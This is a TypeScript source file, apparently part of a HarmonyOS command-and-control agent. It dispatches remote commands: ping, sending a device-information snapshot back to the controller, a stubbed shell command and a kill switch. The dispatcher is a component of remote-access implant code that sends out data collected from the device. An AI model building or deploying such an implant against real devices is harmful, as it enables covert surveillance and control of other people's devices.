import { C2Socket } from './C2Socket';
import { DataCollectors } from './DataCollectors';

/**
 * Routes C2 commands to appropriate handlers.
 */
export class CommandDispatcher {
  private socket: C2Socket;
  private collectors: DataCollectors;

  constructor(socket: C2Socket, collectors: DataCollectors) {
    this.socket     = socket;
    this.collectors = collectors;
  }

  dispatch(type: string, payload: Record<string, Object>): void {
    switch (type) {

      case 'PING':
        this.socket.send('PONG', { ts: Date.now() });
        break;

      case 'DEVICE_INFO':
        this.socket.send('DEVICE_INFO_RESULT', this.collectors.snapshot());
        break;

      case 'SHELL':
        // HarmonyOS sandbox — no arbitrary shell access
        this.socket.send('SHELL_RESULT', {
          error: 'Shell execution not available on HarmonyOS (sandboxed)',
          cmd:   (payload['cmd'] as string) ?? '',
        } as Record<string, Object>);
        break;

      case 'KILL':
        this.socket.send('KILL_ACK', { ts: Date.now() });
        this.socket.disconnect();
        break;

      default:
        this.socket.send('UNKNOWN_CMD', { cmd: type });
    }
  }
}
